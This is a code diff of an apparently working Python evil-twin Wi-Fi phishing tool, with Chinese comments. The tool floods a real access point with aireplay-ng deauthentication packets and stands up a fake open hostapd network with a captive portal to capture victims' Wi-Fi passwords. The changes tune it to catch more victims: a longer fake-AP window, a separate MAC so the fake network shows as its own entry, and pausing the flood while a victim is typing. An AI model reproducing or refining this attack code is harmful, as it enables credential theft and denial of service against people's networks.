@@ -154,20 +154,27 @@ def stop_services():
     time.sleep(1)
 
 def deauth_loop(target, iface):
-    """攻击期间持续踢人：高频压制真 AP（~15 秒一轮，每轮连续轰炸 5 秒），
-    让真 AP 永远没有稳定服务窗口 → 手机连不上真 AP，只能落回假 AP。
+    """攻击期间持续踢人：周期广播 deauth 让真 AP 客户端掉线，
+    直到验证通过自动关闭假 AP 或手动停止（stop_event 置位）。
 
     关键逻辑：以"最近是否有密码提交"判断是否有人在交互——
       - 60 秒内有密码提交 → 跳过本轮（不打断正在输密码的受害者）
-      - 无提交 → 执行压制轮：闪断假 AP + 连续 deauth 轰炸真 AP 5 秒，
-        再恢复假 AP（重新克隆 BSSID），强制受害者手机落回假 AP 触发认证页
+      - 有客户端关联假 AP（iw station dump 非空）→ 暂停压制
+      - 无交互 → 执行压制轮：闪断假 AP + 连续轰炸真 AP 5 秒，
+        再恢复假 AP（长在线窗口 40 秒），让受害者有充足时间连接
     """
     bssid, channel = target["bssid"], target["channel"]
-    log("持续踢人循环启动（高频压制 ~15 秒一轮，每轮轰炸 5 秒；交互中自动暂停）")
+    log("持续踢人循环启动（低频强压制 ~50 秒一轮；有受害者交互则自动暂停）")
     while not deauth_stop.is_set():
         # 有人正在交互（最近 60 秒提交过密码）→ 跳过本轮，避免打断
         if time.time() - last_post_ts() < 60:
             deauth_stop.wait(10)
+            continue
+        # 有客户端正关联着假 AP → 暂停压制，给时间输密码
+        stas = assoc_stations(iface)
+        if stas:
+            log("检测到客户端关联假 AP (%s)，暂停压制 30 秒" % ",".join(sorted(stas)))
+            deauth_stop.wait(30)
             continue
         # 1. 停假 AP → 切 monitor（压制阶段，真 AP 无稳定窗口）
         run(f"systemctl stop {UNITS['hostapd']} 2>/dev/null; systemctl reset-failed {UNITS['hostapd']} 2>/dev/null")
@@ -179,10 +186,9 @@ def deauth_loop(target, iface):
         time.sleep(1)
         # 2. 连续轰炸 5 秒（-0 0 无限循环 + timeout 5，真 AP 全程被打）
         run(f"timeout 5 aireplay-ng -0 0 -a {bssid} {iface}", timeout=12)
-        # 3. 恢复假 AP（managed + 重新克隆 BSSID + 起 hostapd）
+        # 3. 恢复假 AP（managed + 起 hostapd；使用网卡自身 MAC，不克隆 BSSID）
         run(f"ip link set {iface} down; iw dev {iface} set type managed")
         run(f"ip addr flush dev {iface} 2>/dev/null")
-        run(f"ip link set {iface} address {bssid} 2>/dev/null")
         run(f"ip addr add {GATEWAY_IP}/24 dev {iface}")
         run(f"ip link set {iface} up")
         time.sleep(1)
@@ -195,8 +201,21 @@ def deauth_loop(target, iface):
             out, _, _ = run(f"systemctl is-active {UNITS['hostapd']}")
             if "active" in out:
                 break
-        # 4. 假 AP 在线窗口（短暂），随后立即进入下一轮压制
-        deauth_stop.wait(6)
+        # 4. 假 AP 长在线窗口（40 秒），受害者有充足时间发现并连接
+        deauth_stop.wait(40)
+
+def assoc_stations(iface):
+    """当前关联到假 AP 的客户端 MAC（iw station dump 实时关联表）。
+    受害者连上假 AP（即使 MAC 在历史租约里）会立即出现在这里，
+    用于暂停压制、避免把正在输密码的人闪断。"""
+    out, _, _ = run(f"iw dev {iface} station dump 2>/dev/null")
+    macs = set()
+    for line in out.splitlines():
+        line = line.strip()
+        m = re.match(r"^Station ([0-9a-f:]{17})", line)
+        if m:
+            macs.add(m.group(1).lower())
+    return macs
 
 def start_attack(target):
     global deauth_stop, deauth_thread
@@ -214,14 +233,6 @@ def start_attack(target):
     ssid, bssid, channel = target["ssid"], target["bssid"], target["channel"]
     log(f"目标: {ssid} ({bssid}) ch{channel}")
 
-    # 0. 记录网卡原始 MAC（攻击结束时恢复；克隆 BSSID 需要）
-    out, _, _ = run(f"ip link show {IFACE}")
-    _m = re.search(r"ether ([0-9a-fA-F:]{17})", out)
-    if _m:
-        with open(os.path.join(BASE_DIR, "orig_mac"), "w") as _f:
-            _f.write(_m.group(1).lower())
-        log(f"记录网卡原始 MAC: {_m.group(1).lower()}")
-
     # 1. 停掉可能残留的服务与干扰
     stop_services()
     run(f"pkill -x hostapd-mana; pkill -x dnsmasq; pkill -f '^python3.*portal'")
@@ -238,15 +249,14 @@ def start_attack(target):
     log("deauth 完成")
 
     # 3. 恢复接口（hostapd 启动时会自动切 AP），并配置钓鱼网段地址
+    #    注意：假 AP 使用网卡自身 MAC（不克隆真 AP BSSID）——
+    #    克隆会导致手机把真假 AP 合并为一个条目，点进去连的是信号更强的真 AP；
+    #    不同 MAC 时列表显示两个同名 WiFi（真=加密锁 / 假=开放无锁），可明确区分选择
     run(f"ip link set {IFACE} down; iw dev {IFACE} set type managed")
     run(f"ip addr flush dev {IFACE} 2>/dev/null")
     run(f"ip addr add {GATEWAY_IP}/24 dev {IFACE}")
-    # 3b. 克隆目标 BSSID 到网卡：假 AP 与真 AP 同 MAC，手机视为"同一个网络"，
-    #     不再因加密类型不同而抢连真 AP（同 SSID 同 MAC，认证配置不符 → 自动弹认证页）
-    run(f"ip link set {IFACE} address {bssid} 2>/dev/null")
     run(f"ip link set {IFACE} up")
     time.sleep(1)
-    log(f"假 AP 已克隆 BSSID {bssid}（与真 AP 同 MAC）")
 
     # 4. 写配置
     hostapd_cfg = (
@@ -331,17 +341,6 @@ def stop_attack():
     ensure_managed()
     # 清理残留的钓鱼网段地址
     run(f"ip addr flush dev {IFACE} 2>/dev/null")
-    # 恢复网卡原始 MAC（克隆 BSSID 复原）
-    try:
-        _om = os.path.join(BASE_DIR, "orig_mac")
-        if os.path.exists(_om):
-            with open(_om) as _f:
-                _omac = _f.read().strip()
-            if _omac:
-                run(f"ip link set {IFACE} down; ip link set {IFACE} address {_omac}; ip link set {IFACE} up")
-                log(f"已恢复网卡原始 MAC: {_omac}")
-    except Exception as _e:
-        log(f"恢复 MAC 失败（不影响使用）: {_e}")
     with lock:
         state["mode"] = "idle"
         state["target"] = None
